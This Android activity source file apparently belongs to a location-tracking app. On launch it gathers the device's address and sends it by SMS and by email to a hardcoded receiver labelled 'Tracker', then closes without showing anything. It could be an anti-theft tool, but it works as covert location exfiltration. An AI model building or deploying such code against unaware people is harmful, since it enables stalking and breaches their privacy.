package com.wzapps.mobile.activities;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.wzapps.mobile.R;
import com.wzapps.mobile.consts.Consts;
import com.wzapps.mobile.utils.LocationUtil;
import com.wzapps.mobile.utils.MailSenderUtil;
import com.wzapps.mobile.utils.PermissionUtils;
import com.wzapps.mobile.utils.SmsUtils;

import java.util.ArrayList;

public class GLocationActivity extends AppCompatActivity implements PermissionUtils.PermissionResultCallback {

    public static String TAG = GLocationActivity.class.getSimpleName();

    private LocationUtil locationUtil;


    @SuppressLint("MissingPermission")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        checkPermissions();
        sendInfo();
        setContentView(R.layout.activity_main);
    }



    void sendInfo(){
        locationUtil = new LocationUtil(this);
        String message = locationUtil.getTextAddress();
        Log.i(TAG, message);

        sendSMS(message);
        sendMail(message);

        this.finish();

    }

    void sendSMS(String message){
        SmsUtils.sendSMS(message);
    }

    void sendMail(String message){
        MailSenderUtil sender = new MailSenderUtil(Consts.EMAIL_SENDER, Consts.PASS_SENDER);


        Thread thread = new Thread(new Runnable() {

            @Override
            public void run() {
                try  {
                    try {
                        sender.sendMail(Consts.MAIL_SUBJECT,
                                message,
                                Consts.EMAIL_SENDER, "Tracker",
                                Consts.EMAIL_RECEIVER);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });

        thread.start();
    }

    private void checkPermissions(){
        PermissionUtils permissionUtils = new PermissionUtils(GLocationActivity.this);
        ArrayList<String> permissions=new ArrayList<>();

        permissions.add(Manifest.permission.RECEIVE_SMS);
        permissions.add(Manifest.permission.READ_SMS);
        permissions.add(Manifest.permission.SEND_SMS);
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);

        permissionUtils.check_permission(permissions,"Need permissions for getting your location",1);
    }


    @Override
    public void PermissionGranted(int request_code) {
        Log.i("PERMISSION","GRANTED");
    }

    @Override
    public void PartialPermissionGranted(int request_code, ArrayList<String> granted_permissions) {
        Log.i("PERMISSION PARTIALLY","GRANTED");
    }

    @Override
    public void PermissionDenied(int request_code) {
        Log.i("PERMISSION","DENIED");
    }

    @Override
    public void NeverAskAgain(int request_code) {
        Log.i("PERMISSION","NEVER ASK AGAIN");
    }

    public void brCallback(String param){
        Log.d("BroadcastReceiver",param);
    }

}